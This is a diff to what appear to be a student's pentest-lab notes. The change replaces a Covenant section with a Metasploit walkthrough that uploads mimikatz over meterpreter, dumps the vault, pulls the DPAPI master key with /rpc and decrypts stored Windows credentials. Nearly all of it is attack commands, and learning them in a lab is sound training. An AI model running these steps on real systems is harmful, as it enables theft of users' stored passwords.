@@ -111,7 +111,7 @@ ls C:\users\s.chisholm.mayorsec\AppData\Roaming\Microsoft\Protect\<SID-value>
 look for the entry with the same GUID value. Copy the whole directory
 
 ```
-"dpapi::masterkey /in:C:\users\s.chisholm.mayorsec\AppData\Roaming\Microsoft\Protect\<SID-value> /rpc"
+"dpapi::masterkey /in:C:\users\s.chisholm.mayorsec\AppData\Roaming\Microsoft\Protect\<SID>\<GUID> /rpc"
 ```
 
 Get the key... save to notepad.
@@ -122,7 +122,81 @@ Go back to task...
 "dpapi::cred /in:C:\Users\s.chisholm.mayorsec\AppData\Local\Microsoft\Credentials\<hash> /masterkey <key>"
 ```
 
-## cracking credential vault with covenant
+## cracking credential vault with metasploit
+
+in meterpreter session:
+
+```
+meterpreter > upload /opt/Tools/mimikatz_trunk/x64/mimikatz.exe C:\\Users\\Public\\mimikatz.exe
+```
+
+```
+meterpreter > shell
+```
+
+Confirm that mimikatz.exe is uploaded
+
+```
+cd C:\Users\Public
+```
+
+```
+> dir
+```
+
+```
+> dir /a C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials
+```
+
+```
+> mimikatz.exe
+```
+
+```
+mimikatz # vault::cred
+```
+
+Again, hash is the smaller sized file.
+
+```
+mimikatz # dpapi::cred /in:C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials\<hash>
+```
+
+```
+mimikatz # exit
+```
+
+Go to Protect directory:
+
+```
+dir /a C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect
+```
+
+```
+dir /a C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect\<SID>
+```
+
+Get the GUID
+
+```
+mimikatz.exe
+```
+
+```
+mimikatz # dpapi::masterkey /in:C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect\<SID>\<GUID> /rpc
+```
+
+Get the key!
+
+Last but not least:
+
+```
+mimikatz # dpapi::cred /in:C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials\<hash> /masterkey <key>
+```
+
+
+
+
 
 
 
